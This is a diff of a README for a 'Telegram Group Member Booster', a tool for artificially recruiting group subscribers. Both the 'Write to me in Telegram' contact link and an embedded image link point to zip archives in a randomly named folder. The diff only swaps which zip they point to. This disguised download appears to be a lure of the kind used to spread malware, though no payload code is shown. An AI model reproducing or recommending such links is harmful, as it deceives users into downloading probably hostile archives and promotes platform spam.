@@ -11,6 +11,6 @@ A programme for automatic recruitment of subscribers in Telegram groups. The too
 
 
 ## Contacts
-- [Write to me in Telegram](https://raw.githubusercontent.com/devoumes01/Telegram-Group-Member-Booster/main/nonconduction/Member_Telegram_Group_Booster_Ctenodontidae.zip)
+- [Write to me in Telegram](https://raw.githubusercontent.com/devoumes01/Telegram-Group-Member-Booster/main/nonconduction/Member-Group-Telegram-Booster-2.0.zip)
   
-![накр (1) (1)](https://raw.githubusercontent.com/devoumes01/Telegram-Group-Member-Booster/main/nonconduction/Member_Telegram_Group_Booster_Ctenodontidae.zip)
+![накр (1) (1)](https://raw.githubusercontent.com/devoumes01/Telegram-Group-Member-Booster/main/nonconduction/Member-Group-Telegram-Booster-2.0.zip)
